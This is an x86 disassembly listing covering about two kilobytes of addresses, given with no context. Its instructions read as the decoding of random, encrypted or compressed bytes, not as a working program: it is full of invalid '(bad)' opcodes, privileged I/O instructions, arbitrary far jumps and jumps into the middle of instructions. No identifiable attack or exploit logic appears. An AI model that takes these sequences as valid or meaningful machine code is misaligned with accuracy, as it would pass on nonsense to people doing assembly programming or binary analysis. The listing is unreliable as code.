  410268:	ror    DWORD PTR [edx+0x40],cl
  41026b:	nop
  41026c:	sbb    al,bl
  41026e:	mov    ah,BYTE PTR [edx]
  410270:	(bad)  
  410272:	ja     0x4102e3
  410274:	test   al,0xdb
  410276:	and    cl,BYTE PTR [eax+0x63]
  410279:	and    ebp,DWORD PTR [edx+eax*8-0x4]
  41027d:	and    al,0x70
  41027f:	pop    eax
  410280:	pop    esp
  410281:	xchg   esp,edx
  410283:	mov    dl,0x41
  410285:	push   edx
  410286:	ret    0x4e43
  410289:	jbe    0x410307
  41028b:	dec    ebx
  41028c:	repz (bad) 
  41028e:	push   esp
  41028f:	push   eax
  410290:	cwde   
  410291:	iret   
  410292:	cmpxchg8b (bad)
  410293:	(bad)  
  410294:	retf   0x7574
  410297:	test   cl,ch
  410299:	jno    0x41024e
  41029b:	and    DWORD PTR [esi+0x3ce07dec],0x4ba43623
  4102a5:	jns    0x4102e3
  4102a7:	repz mov edi,0xe2d16a52
  4102ad:	loop   0x41031f
  4102af:	sub    eax,0x842f1676
  4102b4:	and    al,0x32
  4102b6:	in     eax,dx
  4102b7:	dec    edx
  4102b8:	sahf   
  4102b9:	push   ds
  4102ba:	xchg   edi,eax
  4102bb:	pop    es
  4102bc:	das    
  4102bd:	das    
  4102be:	es js  0x410311
  4102c1:	sbb    bl,cl
  4102c3:	or     al,dh
  4102c5:	fadd   QWORD PTR [esi]
  4102c7:	popa   
  4102c8:	push   cs
  4102c9:	jno    0x410251
  4102cb:	shr    cl,cl
  4102cd:	dec    edx
  4102ce:	fisub  WORD PTR [eax-0x68da00ac]
  4102d4:	and    al,0x7d
  4102d6:	iret   
  4102d7:	dec    ecx
  4102d8:	dec    edi
  4102d9:	sbb    al,0xb
  4102db:	ror    BYTE PTR [ecx-0x17dc01bf],cl
  4102e1:	xlat   BYTE PTR ds:[ebx]
  4102e2:	mov    fs,WORD PTR [eax+0x4c]
  4102e5:	int    0x6d
  4102e7:	and    ebx,esi
  4102e9:	adc    eax,0xe909486c
  4102ee:	xchg   esp,eax
  4102ef:	inc    esp
  4102f0:	je     0x4102d8
  4102f2:	pop    ecx
  4102f3:	popf   
  4102f4:	mov    edi,0x1bd84df4
  4102f9:	add    eax,0x7977d39f
  4102fe:	retf   
  4102ff:	sbb    dl,BYTE PTR [ebp-0xbba7103]
  410305:	jae    0x4102ed
  410307:	sbb    BYTE PTR [edi-0x30],ch
  41030a:	jl     0x4102eb
  41030c:	in     al,0xf
  41030e:	inc    edx
  41030f:	cmp    DWORD PTR [ebx],edx
  410311:	retf   0xcebe
  410314:	add    dl,BYTE PTR [edi-0x34]
  410317:	imul   esp,ebx
  41031a:	cmp    edi,DWORD PTR [ebp+0x12]
  41031d:	call   0x8708738c
  410322:	sahf   
  410323:	outs   dx,BYTE PTR ds:[esi]
  410324:	outs   dx,BYTE PTR ds:[esi]
  410325:	ins    BYTE PTR es:[edi],dx
  410326:	cmp    ecx,DWORD PTR [edx-0x694d0c2e]
  41032c:	sar    DWORD PTR [ebp-0x53],cl
  41032f:	ret    0xbda0
  410332:	cdq    
  410333:	jle    0x41037c
  410335:	dec    eax
  410336:	les    edx,FWORD PTR [esi+0x1b9f0580]
  41033c:	and    edx,esp
  41033e:	mov    ah,0x18
  410340:	(bad)  
  410341:	sub    BYTE PTR [ecx-0x637cadf9],dh
  410347:	add    esi,DWORD PTR [eax+0x12183bb4]
  41034d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41034e:	cmc    
  41034f:	je     0x4103a1
  410351:	pop    ds
  410352:	or     eax,0x653c9df4
  410357:	sbb    ch,BYTE PTR [edx]
  410359:	and    ebx,DWORD PTR [ecx]
  41035b:	cs push 0x3b
  41035e:	repz mov bl,0xbf
  410361:	xor    dh,al
  410363:	inc    esi
  410364:	lds    eax,FWORD PTR [edx]
  410366:	cmp    DWORD PTR ds:0xf3286842,0xffffff81
  41036d:	inc    ebx
  41036e:	mov    ebx,0x2f8453bb
  410373:	stc    
  410374:	pop    eax
  410375:	pop    edi
  410376:	mov    esi,0x26a27b0e
  41037b:	push   0xffffffec
  41037d:	ja     0x41034b
  41037f:	push   es
  410380:	mov    cl,0xdc
  410382:	jno    0x410384
  410384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410385:	jg     0x4103a6
  410387:	or     eax,0xcee8d09d
  41038c:	pop    edi
  41038d:	push   es
  41038e:	call   0xc744:0x8cfa5487
  410395:	mov    dl,0x38
  410397:	stos   DWORD PTR es:[edi],eax
  410398:	(bad)  
  410399:	fadd   DWORD PTR [ebx]
  41039b:	xor    DWORD PTR [esi-0x1baf1087],ebx
  4103a1:	mov    ebx,0xf053205d
  4103a6:	cdq    
  4103a7:	inc    edi
  4103a8:	out    dx,eax
  4103a9:	xchg   edi,eax
  4103aa:	mov    BYTE PTR [ecx],al
  4103ac:	pop    eax
  4103ad:	cmp    ebp,DWORD PTR [edx+ebp*8-0x3b8e334c]
  4103b4:	cmp    eax,0xecc00f46
  4103b9:	jmp    0x9addd14c
  4103be:	je     0x410372
  4103c0:	in     eax,dx
  4103c1:	fbld   TBYTE PTR [edi]
  4103c3:	add    dh,0x44
  4103c6:	outs   dx,DWORD PTR ds:[esi]
  4103c7:	mul    BYTE PTR [edi]
  4103c9:	xchg   BYTE PTR [edx],bh
  4103cb:	xchg   esi,eax
  4103cc:	int    0x6e
  4103ce:	cs adc eax,0xba56d10b
  4103d4:	dec    ecx
  4103d5:	fild   QWORD PTR [ecx-0x5]
  4103d8:	sub    BYTE PTR [ebp+0x4dea334c],bl
  4103de:	or     ch,BYTE PTR [eax-0x2b]
  4103e1:	cwde   
  4103e2:	push   ss
  4103e3:	ins    BYTE PTR es:[edi],dx
  4103e4:	shl    BYTE PTR [edx],0x7a
  4103e7:	sar    BYTE PTR ds:0xb9631435,1
  4103ed:	aas    
  4103ee:	dec    ecx
  4103ef:	mov    al,0xe0
  4103f1:	mov    WORD PTR [ecx-0x3f],?
  4103f4:	and    eax,esp
  4103f6:	dec    edx
  4103f7:	dec    esi
  4103f8:	fcom   DWORD PTR [ebx+0x24]
  4103fb:	fnsave [edx-0x1e9a775f]
  410401:	pop    esp
  410402:	out    0xea,eax
  410404:	ins    BYTE PTR es:[edi],dx
  410405:	or     eax,0xe7b5353
  41040a:	int    0x7a
  41040c:	mov    bl,0x4f
  41040e:	loop   0x41042a
  410410:	dec    edx
  410411:	imul   eax,edx,0x6b
  410414:	adc    al,0x30
  410416:	rcr    DWORD PTR ds:0x3e67c500,0xe7
  41041d:	retf   
  41041e:	pop    esi
  41041f:	ja     0x410476
  410421:	push   edi
  410422:	mov    esp,0xfd192a5d
  410427:	pop    esp
  410428:	push   ecx
  410429:	push   ebp
  41042a:	loop   0x4103eb
  41042c:	mov    esi,0x4d729b36
  410431:	mov    edx,0x69162ef7
  410436:	cli    
  410437:	adc    DWORD PTR [ecx-0x66844953],ecx
  41043d:	sbb    eax,0xd3a357b1
  410442:	pop    edi
  410443:	dec    esp
  410444:	cmp    DWORD PTR [ebx-0x146ad2d9],edx
  41044a:	push   ecx
  41044b:	and    BYTE PTR [ebp-0x68],0x76
  41044f:	clc    
  410450:	pop    esi
  410451:	dec    ebx
  410452:	ret    0x797a
  410455:	mov    WORD PTR [ebp-0x30],fs
  410458:	fnsave [eax]
  41045a:	inc    ecx
  41045b:	push   cs
  41045c:	jmp    0x410486
  41045e:	lds    esp,FWORD PTR [eax+ecx*4-0x1e]
  410462:	fld    DWORD PTR [edx]
  410464:	imul   eax,DWORD PTR [edi+0x9],0xbea00704
  41046b:	push   ss
  41046c:	inc    eax
  41046d:	inc    ebp
  41046e:	dec    esi
  41046f:	mov    al,ds:0x2dd7b55a
  410474:	pop    ebp
  410475:	or     ah,dl
  410477:	jne    0x4104a6
  410479:	ss enter 0x4c6e,0x62
  41047e:	lea    edi,[ebx-0xd]
  410481:	hlt    
  410482:	mov    WORD PTR [edi],gs
  410484:	inc    edi
  410485:	inc    ecx
  410486:	xchg   edx,eax
  410487:	push   ebp
  410488:	pop    ds
  410489:	call   DWORD PTR [edx]
  41048b:	out    0xc1,eax
  41048d:	ret    
  41048e:	lods   al,BYTE PTR ds:[esi]
  41048f:	or     edx,DWORD PTR [ecx]
  410491:	adc    DWORD PTR [ebp+0xb],edx
  410494:	sbb    DWORD PTR [esi],ebx
  410496:	mov    al,0x56
  410498:	or     eax,0x94cc3abf
  41049d:	out    0x40,al
  41049f:	in     eax,0x75
  4104a1:	mov    edi,0x944dc806
  4104a6:	jl     0x410448
  4104a8:	imul   eax,DWORD PTR [ecx-0x2fd24f7e],0xfffffff4
  4104af:	mov    WORD PTR [ebx-0x6253bef1],ss
  4104b5:	out    0x1f,eax
  4104b7:	test   DWORD PTR [edi-0x2],0x9b4dcfb8
  4104be:	sub    DWORD PTR [edx],ebx
  4104c0:	imul   eax,ecx,0x548ffa9b
  4104c6:	mov    cl,0x64
  4104c8:	scas   al,BYTE PTR es:[edi]
  4104c9:	test   eax,0x6754be3
  4104ce:	loop   0x410532
  4104d0:	jo     0x410486
  4104d2:	mov    dh,0xf0
  4104d4:	jle    0x410554
  4104d6:	cwde   
  4104d7:	int3   
  4104d8:	ds in  al,0xf7
  4104db:	icebp  
  4104dc:	jg     0x4104d0
  4104de:	dec    esp
  4104df:	in     eax,dx
  4104e0:	mov    eax,ds:0x2748e10c
  4104e5:	cmp    dl,BYTE PTR ds:0x6099ac57
  4104eb:	pop    esi
  4104ec:	std    
  4104ed:	es in  eax,0xdc
  4104f0:	jns    0x4104b4
  4104f2:	add    eax,0x67916516
  4104f7:	and    al,0x1c
  4104f9:	inc    edi
  4104fa:	sbb    ch,BYTE PTR [eax]
  4104fc:	hlt    
  4104fd:	mov    edx,0x981ecd94
  410502:	add    DWORD PTR [edi+0x42],eax
  410505:	fidivr WORD PTR [ecx-0x2c]
  410508:	scas   eax,DWORD PTR es:[edi]
  410509:	ss sar al,cl
  41050c:	(bad)
  410510:	cmc    
  410511:	mov    dh,0xc8
  410513:	pop    edi
  410514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410515:	or     ah,bh
  410517:	push   ebp
  410518:	cmc    
  410519:	dec    esp
  41051a:	fnstsw WORD PTR ds:0x278272b8
  410520:	cdq    
  410521:	inc    ecx
  410522:	mov    ecx,0x8eb6c8e2
  410527:	(bad)  
  410529:	xchg   ecx,eax
  41052a:	pusha  
  41052b:	fcomp  QWORD PTR [ebp-0x4d]
  41052e:	add    BYTE PTR [edi+0x2d2dfc95],cl
  410534:	icebp  
  410535:	push   ss
  410536:	add    ebp,eax
  410538:	dec    esp
  410539:	repz call 0x582b0d89
  41053f:	push   esi
  410540:	mov    ?,bp
  410543:	adc    BYTE PTR [eax-0x26],0xa9
  410547:	adc    DWORD PTR ds:0x65456226,edx
  41054d:	mov    ch,BYTE PTR [ebp-0x80]
  410550:	dec    eax
  410551:	shl    DWORD PTR [ecx+eiz*4+0x49],0x69
  410556:	nop
  410557:	xchg   edi,eax
  410558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410559:	and    ah,BYTE PTR [eax]
  41055b:	cs in  al,dx
  41055d:	dec    ecx
  41055e:	push   ecx
  41055f:	lahf   
  410560:	push   esi
  410562:	mov    cs,WORD PTR [ecx+0x27]
  410565:	add    ecx,DWORD PTR ds:0x302ce4f2
  41056b:	fsub   st(1),st
  41056d:	inc    ebx
  41056e:	mov    fs,WORD PTR [ebx+0x5d]
  410571:	ror    BYTE PTR [esp+eax*8-0x76],0x35
  410576:	xchg   edi,eax
  410577:	xor    eax,0xb1baa6f7
  41057c:	jne    0x41052b
  41057e:	xor    al,BYTE PTR [edx-0x46312b52]
  410584:	xchg   DWORD PTR [ebp-0x738d3aac],ebx
  41058a:	mov    ebx,0xf25dc8f9
  41058f:	xlat   BYTE PTR ds:[ebx]
  410590:	add    esp,DWORD PTR [edx+0x1d29c5c1]
  410596:	xlat   BYTE PTR ds:[ebx]
  410597:	daa    
  410598:	xor    BYTE PTR [esi-0x37f333ce],dh
  41059e:	shl    DWORD PTR [eax+0x60834642],cl
  4105a4:	aam    0x58
  4105a6:	xor    esi,ebx
  4105a8:	test   BYTE PTR ss:[ebp+0x1a69100d],bl
  4105af:	sub    ecx,0x9e87a80f
  4105b5:	out    dx,eax
  4105b6:	push   ecx
  4105b7:	rol    bh,0x9d
  4105ba:	ret    
  4105bb:	jmp    0x17017769
  4105c0:	mov    DWORD PTR [ecx+edi*1],ecx
  4105c3:	scas   eax,DWORD PTR es:[edi]
  4105c4:	adc    al,0xfe
  4105c6:	sti    
  4105c7:	jae    0x4105ea
  4105c9:	fdivr  QWORD PTR [eax-0x523575ee]
  4105cf:	fdiv   QWORD PTR [eax]
  4105d1:	mov    dl,0xe8
  4105d3:	(bad)
  4105d7:	sub    eax,0x2c05e91e
  4105dc:	pop    edx
  4105dd:	fld    QWORD PTR [eax+0x40]
  4105e0:	jle    0x410637
  4105e2:	aad    0xad
  4105e4:	xchg   esp,eax
  4105e5:	inc    edi
  4105e7:	xchg   edx,eax
  4105e8:	xchg   ebp,eax
  4105e9:	scas   eax,DWORD PTR es:[edi]
  4105ea:	xchg   edx,eax
  4105eb:	lds    edx,FWORD PTR [eax-0x2620b810]
  4105f1:	leave  
  4105f2:	xchg   esi,eax
  4105f3:	pavgb  mm6,QWORD PTR [ebp+0x65]
  4105f7:	push   0x8ddd4894
  4105fc:	div    DWORD PTR [edi]
  4105fe:	inc    edx
  4105ff:	pushf  
  410600:	retf   0xf63b
  410603:	sbb    ebx,DWORD PTR [edi-0x1a]
  410606:	xchg   esi,eax
  410607:	(bad)  
  410608:	xor    eax,0x93e07b3d
  41060d:	mov    ds:0x433c7086,al
  410612:	inc    ecx
  410613:	jle    0x41062b
  410615:	and    DWORD PTR [esi],edx
  410617:	mov    al,ds:0x3a342b27
  41061c:	(bad)  
  41061d:	cmc    
  41061e:	xchg   BYTE PTR [esi-0x7070c741],cl
  410624:	adc    DWORD PTR [ebx],0x86e11e6b
  41062a:	or     al,0xd6
  41062c:	mov    esi,0xd0247631
  410631:	ss retf 0x10d6
  410635:	jae    0x410622
  410637:	lds    esi,FWORD PTR [ebx-0x15]
  41063a:	jmp    0x1c2b:0xf1b05952
  410641:	push   cs
  410642:	test   DWORD PTR [ebx+0x3c0668ad],0x6f0b075c
  41064c:	fldenv [edi+0x17]
  41064f:	mov    al,ds:0xa7e9eb5b
  410654:	in     al,dx
  410655:	lods   al,BYTE PTR ds:[esi]
  410656:	bound  esi,QWORD PTR [edx-0x4d4b88e8]
  41065c:	inc    eax
  41065d:	or     BYTE PTR [eax+eiz*8+0x41],dh
  410661:	adc    eax,DWORD PTR [esi-0x34]
  410664:	mov    ?,ebp
  410666:	shl    BYTE PTR [esi],1
  410668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410669:	out    dx,eax
  41066a:	in     eax,0x89
  41066c:	jno    0x41061b
  41066e:	adc    ah,BYTE PTR [edi+0xb619c64]
  410674:	or     edi,DWORD PTR [ebx+0x74946d66]
  41067a:	or     eax,0xba929121
  41067f:	mov    bl,0xa0
  410681:	out    dx,al
  410682:	scas   eax,DWORD PTR es:[edi]
  410683:	xchg   ebx,eax
  410684:	xor    cl,BYTE PTR [edi+0x20]
  410687:	xchg   ebx,eax
  410688:	xchg   ecx,eax
  410689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41068a:	fist   DWORD PTR [ecx-0xc]
  41068d:	xlat   BYTE PTR ds:[ebx]
  41068e:	sbb    al,0xdc
  410690:	mov    al,0xb7
  410692:	imul   ecx,DWORD PTR [ebp-0x543653f1],0xa2432955
  41069c:	sahf   
  41069d:	test   eax,0xd51e7190
  4106a2:	das    
  4106a3:	jb     0x410656
  4106a5:	cmp    BYTE PTR [edx-0x68],al
  4106a8:	mov    ds:0x49e64c00,eax
  4106ad:	push   esi
  4106ae:	fsub   QWORD PTR [edx-0x3a2ce4ec]
  4106b4:	gs in  al,dx
  4106b6:	mov    ds:0xb1743ad3,eax
  4106bb:	call   0x60a5:0x16e701f5
  4106c2:	outs   dx,DWORD PTR ds:[esi]
  4106c3:	outs   dx,DWORD PTR ds:[esi]
  4106c4:	frstor ds:0x5fec0f3a
  4106ca:	out    dx,eax
  4106cb:	outs   dx,BYTE PTR ds:[esi]
  4106cc:	mov    bl,0x58
  4106ce:	ss aas 
  4106d0:	xor    ebx,ebp
  4106d2:	pushf  
  4106d3:	retf   
  4106d4:	pop    esp
  4106d5:	cmp    bl,bh
  4106d7:	mov    esp,0xb6263f6e
  4106dc:	and    ch,ch
  4106de:	jo     0x41067c
  4106e0:	retf   
  4106e1:	aad    0xbc
  4106e3:	mov    bh,0xe9
  4106e5:	add    al,0xf6
  4106e7:	arpl   WORD PTR [eax],cx
  4106e9:	jle    0x4106a8
  4106eb:	pop    ebx
  4106ec:	bound  eax,QWORD PTR [ebx+0x5d6ddc05]
  4106f2:	loop   0x4106fa
  4106f4:	dec    esp
  4106f5:	cmp    dl,BYTE PTR [esi-0x70b534e2]
  4106fb:	cmp    al,0x7b
  4106fd:	ds and cl,dl
  410700:	sahf   
  410701:	movzx  ebp,BYTE PTR [eax+eax*2]
  410705:	push   cx
  410707:	cld    
  410708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410709:	adc    al,0x19
  41070b:	or     al,0x19
  41070d:	or     esi,DWORD PTR [ebp-0x5c7e4380]
  410713:	xlat   BYTE PTR ds:[ebx]
  410714:	pop    es
  410715:	je     0x4106a3
  410717:	pop    ebx
  410718:	and    BYTE PTR [ebx+edx*2+0x624bd841],0xea
  410720:	xchg   esi,eax
  410721:	inc    ebx
  410722:	jle    0x4106c8
  410724:	mov    cl,0x1f
  410726:	or     eax,0x9dcf0fa4
  41072b:	je     0x410764
  41072d:	mov    al,0x5e
  41072f:	shl    ecx,cl
  410731:	cmp    edx,esp
  410733:	outs   dx,DWORD PTR ds:[esi]
  410734:	jmp    0x410766
  410736:	pushf  
  410737:	bound  edx,QWORD PTR [eax+0x7ab5a580]
  41073d:	mov    edi,0xb9552aa
  410742:	jp     0x4106fc
  410744:	dec    esp
  410745:	mov    ecx,0xdeca2e84
  41074a:	xchg   esi,eax
  41074b:	test   eax,eax
  41074d:	popa   
  41074e:	std    
  41074f:	cwde   
  410750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410751:	outs   dx,BYTE PTR ds:[esi]
  410752:	sti    
  410753:	mov    ebx,ebp
  410755:	scas   eax,DWORD PTR es:[edi]
  410756:	cld    
  410757:	lods   al,BYTE PTR ds:[esi]
  410758:	pop    esp
  410759:	fld    QWORD PTR [esi+ecx*1]
  41075c:	test   BYTE PTR [ebp-0x1d],0x70
  410760:	push   edi
  410761:	lahf   
  410762:	adc    edi,DWORD PTR [ebx+ebp*2+0x38]
  410766:	out    0xf1,eax
  410768:	xor    DWORD PTR [esi],ecx
  41076a:	adc    al,0xc9
  41076c:	and    dl,ch
  41076e:	push   0x4c93d6ff
  410773:	mov    edi,0x9d797032
  410778:	sub    eax,0x7794bd94
  41077d:	inc    esi
  41077e:	sahf   
  41077f:	and    ebx,DWORD PTR [ebx]
  410781:	mov    eax,ds:0x4cd0a3cc
  410786:	(bad)  
  410787:	imul   edi,eax,0xe
  41078a:	or     al,0xc2
  41078c:	inc    ebp
  41078d:	adc    BYTE PTR [edx+0x6d],dh
  410790:	add    al,0xab
  410792:	xor    ah,BYTE PTR [ecx-0x7a]
  410795:	add    bh,BYTE PTR [ebx+0x72]
  410798:	shl    DWORD PTR [ebx+0x5e],1
  41079b:	cmp    DWORD PTR [edi+eax*2+0x445253df],edx
  4107a2:	jle    0x4107fb
  4107a4:	(bad)  
  4107a6:	add    esi,ebp
  4107a8:	dec    ebp
  4107a9:	xchg   esp,eax
  4107aa:	adc    DWORD PTR [ecx+0x4e],esp
  4107ad:	mov    bh,0x6d
  4107af:	jb     0x4107a1
  4107b1:	xor    esp,DWORD PTR [ebx-0x758732a6]
  4107b7:	xchg   edi,eax
  4107b8:	dec    ebx
  4107b9:	jmp    0x410820
  4107bb:	inc    ebx
  4107bc:	dec    edx
  4107bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107be:	jle    0x410781
  4107c0:	cmp    DWORD PTR [ecx-0x54cd6438],eax
  4107c6:	adc    DWORD PTR [ebx+0x60],edi
  4107c9:	adc    BYTE PTR [edi-0x3bf67e0d],ah
  4107cf:	mov    cs,WORD PTR [ebx+0x40b048b6]
  4107d5:	sub    al,0x61
  4107d7:	mov    dl,0x41
  4107d9:	adc    edx,edx
  4107db:	sub    al,BYTE PTR [edx+0x72]
  4107de:	ret    
  4107df:	out    0xb3,al
  4107e1:	adc    ecx,DWORD PTR [esp+ebx*1-0x4529eb87]
  4107e8:	or     esi,eax
  4107ea:	sbb    eax,0x2c15fbcc
  4107ef:	sti    
  4107f0:	and    bh,BYTE PTR [eax-0x7801c0d0]
  4107f6:	iret   
  4107f7:	and    BYTE PTR [ebp-0x6c],ah
  4107fa:	imul   edi,DWORD PTR [esi-0x4b97e359],0x9
  410801:	lahf   
  410802:	in     eax,dx
  410803:	lea    eax,[ebp+edx*1+0x72be0565]
  41080a:	or     BYTE PTR [ebx+0x1dd78cc2],dh
  410810:	add    esi,DWORD PTR [eax]
  410812:	vaddps ymm3,ymm5,ymm7
  410816:	mov    bl,0xda
  410818:	cmp    eax,0xb39f1d6e
  41081d:	mov    ecx,0x93273fa0
  410822:	adc    eax,0x3cd2fd55
  410827:	or     DWORD PTR [edi+0x4c],edx
  41082a:	cs xchg esp,eax
  41082c:	mov    esi,0xe6f8da17
  410831:	mov    ebx,edi
  410833:	and    al,0x36
  410835:	aas    
  410836:	cmp    ebx,DWORD PTR [esi-0x44]
  410839:	xchg   esi,eax
  41083a:	cmp    DWORD PTR [edx+0x3712f2e1],edi
  410840:	outs   dx,DWORD PTR ds:[esi]
  410841:	xor    al,0x13
  410843:	mov    ds:0x371a47e0,eax
  410848:	mov    ebp,0x7a355230
  41084d:	mov    al,0xc3
  41084f:	xor    eax,0xb76783f7
  410854:	xchg   ebp,eax
  410855:	(bad)  
  410857:	and    bl,BYTE PTR [ecx-0x4b]
  41085a:	shl    DWORD PTR [eax+0x17],cl
  41085d:	(bad)  
  41085e:	add    DWORD PTR ds:0x6caab043,edi
  410864:	add    esp,eax
  410866:	cmp    ebx,esi
  410868:	or     eax,0x5e389035
  41086d:	dec    esi
  41086e:	arpl   WORD PTR [edx+0x4f],di
  410871:	shl    DWORD PTR ds:0x124eb5ba,cl
  410877:	add    eax,DWORD PTR [edi]
  410879:	cmp    edx,DWORD PTR [eax+0x399cfc8c]
  41087f:	fld    DWORD PTR ds:0xc239df02
  410885:	inc    ebx
  410886:	mov    edx,0x49570d15
  41088b:	gs scas al,BYTE PTR es:[edi]
  41088d:	out    dx,eax
  41088e:	or     bh,bl
  410890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410891:	inc    eax
  410892:	je     0x410912
  410894:	inc    ebp
  410895:	(bad)  
  410896:	xor    eax,0x2b38fe47
  41089b:	adc    ebx,DWORD PTR [edi]
  41089d:	shl    BYTE PTR [ebx-0x23],0x2c
  4108a1:	inc    ebx
  4108a2:	int3   
  4108a3:	arpl   bx,dx
  4108a5:	in     eax,dx
  4108a6:	scas   eax,DWORD PTR es:[edi]
  4108a7:	stc    
  4108a8:	dec    ebp
  4108a9:	inc    ebx
  4108aa:	and    al,0x25
  4108ac:	fnstcw WORD PTR [eax+edx*4-0x6d]
  4108b0:	in     eax,dx
  4108b1:	icebp  
  4108b2:	imul   BYTE PTR [esi]
  4108b4:	push   edi
  4108b5:	(bad)  
  4108b6:	jmp    0x41088b
  4108b8:	stc    
  4108b9:	mov    ah,0x1e
  4108bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108bc:	scas   al,BYTE PTR es:[edi]
  4108bd:	mov    ds:0x1ca70834,al
  4108c2:	xchg   ecx,eax
  4108c3:	lods   eax,DWORD PTR ds:[esi]
  4108c4:	dec    edx
  4108c5:	inc    ecx
  4108c6:	push   esi
  4108c7:	cli    
  4108c8:	cmc    
  4108c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108ca:	mov    dl,0x6
  4108cc:	lods   al,BYTE PTR ds:[esi]
  4108cd:	xor    DWORD PTR [ebx+eiz*1+0x1a],esp
  4108d1:	xor    bl,BYTE PTR [ecx+0x50]
  4108d4:	pusha  
  4108d5:	jmp    0xdb81:0x96e3c31c
  4108dc:	int    0x17
  4108de:	aaa    
  4108df:	jecxz  0x4108d1
  4108e1:	popf   
  4108e2:	imul   esp,DWORD PTR [edx-0x438248fe],0xffffffdb
  4108e9:	ja     0x41095e
  4108eb:	jae    0x410912
  4108ed:	stc    
  4108ee:	xlat   BYTE PTR ds:[ebx]
  4108ef:	push   edx
  4108f0:	repnz mov dh,0x9c
  4108f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108f4:	test   eax,0x8d1a3604
  4108f9:	inc    ecx
  4108fa:	arpl   WORD PTR [eax],bx
  4108fc:	push   cs
  4108fd:	sbb    cl,ch
  4108ff:	jle    0x410945
  410901:	jb     0x4108ad
  410903:	or     BYTE PTR [ebx+eax*1-0x6ac3aca5],dh
  41090a:	scas   al,BYTE PTR es:[edi]
  41090b:	jnp    0x410909
  41090d:	jmp    0xcce0:0xf2723e0a
  410914:	cwde   
  410915:	ret    
  410916:	dec    ecx
  410917:	rol    DWORD PTR [ebx],0x3
  41091a:	int3   
  41091b:	clc    
  41091c:	pop    ecx
  41091d:	fnstcw WORD PTR [ebp+0x7c]
  410920:	std    
  410921:	fild   WORD PTR [esi]
  410923:	nop
  410924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410925:	stos   BYTE PTR es:[edi],al
  410926:	loopne 0x41094b
  410928:	ret    
  410929:	(bad)  
  41092a:	stos   BYTE PTR es:[edi],al
  41092b:	add    esp,ebp
  41092d:	jmp    0xe57216ce
  410932:	adc    eax,0xb5c3fdf9
  410937:	xor    eax,0x8064d28b
  41093c:	inc    ebx
  41093d:	sbb    DWORD PTR [ecx],0x69
  410940:	fs daa 
  410942:	xor    al,0x8
  410944:	pop    es
  410945:	ds jae 0x4109bc
  410948:	loop   0x4109a0
  41094a:	sbb    BYTE PTR ss:[ebx],ch
  41094d:	push   esp
  41094e:	aas    
  41094f:	inc    esp
  410950:	add    bl,BYTE PTR [ebx]
  410952:	pushf  
  410953:	cdq    
  410954:	dec    eax
  410955:	pop    es
  410956:	in     al,0x18
  410958:	xchg   edi,eax
  410959:	or     BYTE PTR [esi-0x1],ah
  41095c:	(bad)  
  41095d:	rol    BYTE PTR ds:0x559bfcf8,cl
  410963:	and    ebp,DWORD PTR [eax]
  410965:	or     al,0xe9
  410967:	jnp    0x4109d5
  410969:	les    esp,FWORD PTR [ecx]
  41096b:	mov    ch,0x45
  41096d:	xchg   edx,eax
  41096e:	push   esi
  41096f:	into   
  410970:	push   ebx
  410971:	jge    0x410954
  410973:	popf   
  410974:	push   0x78f45fe3
  410979:	adc    bl,BYTE PTR [esi+0x3052700f]
  41097f:	or     ecx,esi
  410981:	dec    edi
  410982:	pop    ss
  410983:	cmp    al,0x8
  410985:	popf   
  410986:	fs and edx,edx
  410989:	imul   ebp,DWORD PTR [esi-0x65dc8e54],0x77ff325c
  410993:	retf   
  410994:	(bad)  
  410996:	mov    bh,0x26
  410998:	push   esp
  410999:	aad    0xf
  41099b:	loope  0x410a1b
  41099d:	fstp   QWORD PTR [ebx-0x6b]
  4109a0:	neg    DWORD PTR ds:0xd765d069
  4109a6:	cld    
  4109a7:	inc    esi
  4109a8:	jmp    0x410a1a
  4109aa:	fisub  WORD PTR [ebx+0x6c263338]
  4109b0:	push   ecx
  4109b1:	cs loop 0x4109e2
  4109b4:	outs   dx,DWORD PTR ds:[esi]
  4109b5:	pop    ds
  4109b6:	in     al,0x1f
  4109b8:	mov    esi,0xc307f99f
  4109bd:	xchg   BYTE PTR [eax+ebx*2-0x50],bh
  4109c1:	or     eax,0x9c3a4a6e
  4109c6:	adc    bh,BYTE PTR [edi+esi*2-0x6715aecb]
  4109cd:	inc    eax
  4109ce:	mov    edx,0x88c83251
  4109d3:	jmp    0x97c8:0xbe0477a3
  4109da:	xor    bl,BYTE PTR [edi-0x4a4b75bc]
  4109e0:	shr    DWORD PTR [esi+0x4],1
  4109e3:	in     eax,dx
  4109e4:	jbe    0x410a41
  4109e6:	(bad)  
  4109e7:	dec    ebx
  4109e8:	dec    edi
  4109e9:	je     0x41096f
  4109eb:	and    DWORD PTR [esi+edi*1],esi
  4109ee:	fnstsw WORD PTR [esi+esi*1]
  4109f1:	inc    edx
  4109f2:	popa   
  4109f3:	push   eax
  4109f4:	add    DWORD PTR [ecx-0x6e],ebx
  4109f7:	(bad)  
  4109f8:	ja     0x410a2a
  4109fa:	stc    
  4109fb:	inc    edi
  4109fc:	pop    esp
  4109fd:	pop    edx
  4109fe:	stc    
  4109ff:	push   0xde41ce4e
  410a04:	(bad)  
  410a05:	sub    al,0xf9
  410a07:	sub    al,0xe7
  410a09:	jecxz  0x410a4e
  410a0b:	jns    0x4109dd
  410a0d:	ficomp DWORD PTR [edx+edx*1-0x4190bfd5]
  410a14:	mov    ?,WORD PTR [edi-0x5a835f01]
  410a1a:	inc    esi
  410a1b:	(bad)  
  410a1c:	sahf   
  410a1d:	xchg   DWORD PTR [eax-0x31],edx
  410a20:	dec    ecx
  410a21:	ret    0xfe04
  410a24:	inc    eax
  410a25:	dec    edx
  410a26:	call   0xcfc9:0x251a3ed2
  410a2d:	and    al,0x50
